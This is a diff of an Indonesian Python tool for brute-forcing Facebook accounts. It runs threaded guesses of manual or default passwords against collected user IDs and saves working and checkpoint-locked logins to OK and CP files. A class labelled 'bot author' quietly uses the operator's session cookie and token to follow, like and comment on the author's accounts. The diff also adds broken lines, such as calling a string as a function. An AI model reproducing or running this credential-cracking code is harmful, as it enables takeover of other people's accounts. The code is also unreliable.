@@ -6,8 +6,8 @@ Facebook  = 'Facebook.com/fikritampan305'
 Instagram = 'Instagram.com/fi_sinaga'
 Whatsapp  = '081269496231'
 YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
-Version   = '0.6'
-Denventa  = 100080716718035
+Version   = '2.0'
+Syafii  = 100080716718035
 Postingan = 115753054458585
 komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
 ##### >>>> IMPORT MODULE
@@ -66,7 +66,7 @@ ___________________________________________________
 | |_| | |  | | |_) |  _|   |[•]Brute Fb
 |____/|_|  |_|____/|_|     |[•]11-04-2022
 ____________________________________________________
- |""")
+ |"""(Version))
 
 
 ###----------[ TIME ]---------- ###
@@ -174,22 +174,22 @@ def convert_id(username):
     
 ###----------[ EXCEPTION ]---------- ###
 def kecuali(error):
-    print('\n   %s[%s•%s] %sTerjadi Kesalahan %s!%s'%(M,P,M,P,M,P))
-    print('       %s• %sTidak Dapat Mengeksekusi %s\n'%(M,A,error))
-    print('   %s[%s•%s] %sHal Ini Mungkin Terjadi Karena %s:%s'%(M,P,M,P,M,P))
-    print('       %s• %sCookies/Token Invalid'%(M,A))
-    print('       %s• %sSalah Memasukkan ID'%(M,A))
-    print('       %s• %sBug Pada Source Code'%(M,A))
-    print('       %s• %sBug Pada Requests'%(M,A))
-    print('       %s• %sDan Lain-Lain\n'%(M,A))
-    print('   %s[%s•%s] %sJalankan Ulang Source Code Ini %s:%s'%(M,P,M,P,M,P))
-    print('       %s• %spython sakera.py\n'%(M,A))
+    print(f"{P}[+] Terjadi Kesalahan !")
+    print(f"{P}[+] Tidak Dapat Mengeksekusi"(error))
+    print(f"{P}[+] Hal Ini Mungkin Terjadi : ")
+    print(f"{P}[01] Cookies/Token Invalid")
+    print(f"{P}[02] Salah Memasukkan ID")
+    print(f"{P}[03] bug Pada Source Code")
+    print(f"{P}[04] Bug Pada Requests")
+    print(f"{P}[05] Dan Lain-Lain")
+    print(f"{P}[•] Jalankan Ulang Source Code Ini : ")
+    print(f"{P}[•] python yuki.py")
     exit()
 
-###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
+###----------[BOT AUTHOR JANGAN DIGANTI ]---------- ###
 class bot_author:
     def __init__(self,cookie,token,cookie_mentah):
-        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
+        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Syafii)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
         for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
     def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
         with requests.Session() as xyz:
@@ -601,15 +601,15 @@ def cek_hasil():
 
 def cek_results():
     try:
-        open("OK/%s.txt"%(hari_ini))
+        open("OK/%s.json"%(tanggal))
     except IOError:
-        os.system("touch OK/%s.txt"%(hari_ini))
+        os.system("touch OK/%s.json"%(tanggal))
     try:
-        open("CP/%s.txt"%(hari_ini))
+        open("CP/%s.json"%(tanggal))
     except IOError:
-        os.system("touch CP/%s.txt"%(hari_ini))
-    cp=("CP/%s.txt"%(hari_ini))
-    ok=("OK/%s.txt"%(hari_ini))
+        os.system("touch CP/%s.json"%(tanggal))
+    cp=("CP/%s.json"%(tanggal))
+    ok=("OK/%s.json"%(tanggal))
     hsl_cp=open(cp,"r").read()
     hsl_ok=open(ok,"r").read()
     print(f"{B} | ")
@@ -623,13 +623,13 @@ def cek_results():
         if len(hsl_cp) != 0:
             print(f"{B} | ")
             print(f"{P}[•]{M} Results cp{B}")
-            os.system("cat CP/%s.txt"%(hari_ini))
+            os.system("cat CP/%s.json"%(tanggal))
         else:print(f"{M}[•] Tidak ada hasil")
     elif _pil3h in ["2","02"]:
         if len(hsl_ok) != 0:
             print(f"{B} | ")
             print(f"{P}[•]{I} Results ok")
-            os.system("cat OK/%s.txt"%(hari_ini))
+            os.system("cat OK/%s.json"%(tanggal))
         else:print(f"\n{P}[•]{M} Tidak ada hasil")
     elif _pil3h in ["0","00"]:
         menu()
@@ -640,7 +640,7 @@ def fii_xd():
 	kone()
 	print(f"{B} | ")
 	print(f"{B} | ")
-	fiisayangwidiya =input(f"{P}[•] Input : {B}")
+	fiisayangwidiya =input(f"{P}[•] Pilih : {B}")
 	if fiisayangwidiya in [""]:
 		print(f"{B} | ")
 		print(f"{P}[•]{M} Pilihan tidak boleh kosong");exit()
@@ -648,7 +648,7 @@ def fii_xd():
 		print(f"{P}[•] Tampilan kan opsi akun chek point {B}Y/t")
 		jalan(f"{P}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
 		print(f"{B} | ")
-		_checkoptions_=input(f"{P}[•] Input : {B}")
+		_checkoptions_=input(f"{P}[•] Pilih : {B}")
 		if _checkoptions_ in ["y","Y"]:
 			try:
 				_key = "anjink"
@@ -657,7 +657,7 @@ def fii_xd():
 					print(f"{B} | ")
 					print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
 					print(f"{B} | ")
-					ter =input(f"{P}[•] Input : {B}")
+					ter =input(f"{P}[•] Pilih : {B}")
 					if ter in ["m","M"]:
 						with ThreadPoolExecutor(max_workers=30) as coeg:
 							print(f"{B} | ")
@@ -668,14 +668,12 @@ def fii_xd():
 							if len(asu) =="":
 								print(f"{B} | ")
 								print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
-							started()
 							for user in id:
 								uid, name = user.split("<=>")
 								coeg.submit(api, uid, asu)
-						exit()
+						started()
 					elif ter in ["d","D"]:
 						with ThreadPoolExecutor(max_workers=30) as coeg:
-							started()
 							for user in id:
 								uid, name = user.split("<=>")
 								frist=name.split(" ")
@@ -696,7 +694,7 @@ def fii_xd():
 			print(f"{B} | ")
 			print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
 			print(f"{B} | ")
-			ter =input(f"{P}[•] Input : {B}")
+			ter =input(f"{P}[•] Pilih : {B}")
 			if ter in ["m","M"]:
 				with ThreadPoolExecutor(max_workers=30) as coeg:
 					print(f"{B} | ")
@@ -707,15 +705,13 @@ def fii_xd():
 					if len(asu) =="":
 						print(f"{B} | ")
 						print(f"{B} | ")
-						print(f"{P}[•]{M} Sandi tidak boleh kosong")
-					started()
+						print(f"{P}[•]{M} Sandi tidak boleh kosong");exit()
 					for user in id:
 						uid, name = user.split("<=>")
 						coeg.submit(api, uid, asu)
-				exit()
+				started()
 			elif ter in ["d","D"]:
 				with ThreadPoolExecutor(max_workers=30) as coeg:
-					started()
 					for user in id:
 						uid, name = user.split("<=>")
 						frist=name.split(" ")
@@ -757,11 +753,10 @@ def fii_xd():
 							if len(asu) =="":
 								print(f"{B} | ")
 								print(f"{P}[•]{M} Sandi tidak boleh kosong anjink");exit()
-							started()
 							for user in id:
 								uid, name = user.split("<=>")
 								coeg.submit(mbasic, uid, asu)
-						exit()
+								started()
 					elif ter in ["d","D"]:
 						with ThreadPoolExecutor(max_workers=30) as coeg:
 							for user in id:
@@ -823,7 +818,7 @@ def fii_xd():
 		print(f"{P}[•] Tampilkan opsi chekpoint {B}Y/T")
 		jalan(f"{P}[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
 		print(f"{B} | ")
-		_checkoptions_=input(f"{P}[•] Input : {B}")
+		_checkoptions_=input(f"{P}[•] Pilih : {B}")
 		if _checkoptions_ in ["y","Y"]:
 			try:
 				_key = "Anjink"
@@ -833,7 +828,7 @@ def fii_xd():
 					print(f"{B} | ")
 					print(f"{P}[•] Crack menggunakan password manual/default {B}M/D")
 					print(f"{B} | ")
-					ter =input(f"{P}[•] Input : {B}")
+					ter =input(f"{P}[•] Pilih : {B}")
 					if ter in ["m","M"]:
 						with ThreadPoolExecutor(max_workers=30) as coeg:
 							print(f"{B} | ")
@@ -862,7 +857,7 @@ def fii_xd():
 								else:
 									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
 								coeg.submit(mbasic, uid, fii)
-						started()
+								started()
 				else:
 				  print(f"{key}");started()
 			except (KeyError,IOError):print(f"{_key}");exit()
@@ -872,7 +867,7 @@ def fii_xd():
 			print(f"{B} | ")
 			print(f"{P}[•] Crack menggunakan pasword manual/defaults {B}M/D")
 			print(f"{B} | ")
-			ter =input(f"{P}[•] Input : {B}")
+			ter =input(f"{P}[•] Pilih : {B}")
 			if ter in ["m","M"]:
 				with ThreadPoolExecutor(max_workers=30) as coeg:
 					print(f"{B} | ")
@@ -926,7 +921,6 @@ def api(uid, fii):
     except IOError:
         ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
     global ok, cp, loop, token, cookie
-  #  sys.stdout.write("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(loop,len(id),len(ok),len(cp)));sys.stdout.flush()
     sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
     for pw in fii:
         pw = pw.lower()
@@ -1261,6 +1255,6 @@ def cek_log(uid,pw,ua):
 
 
 if __name__=="__main__":
-    os.system("git pull")
+    resik()
     mkdir_data_login()
     menu()
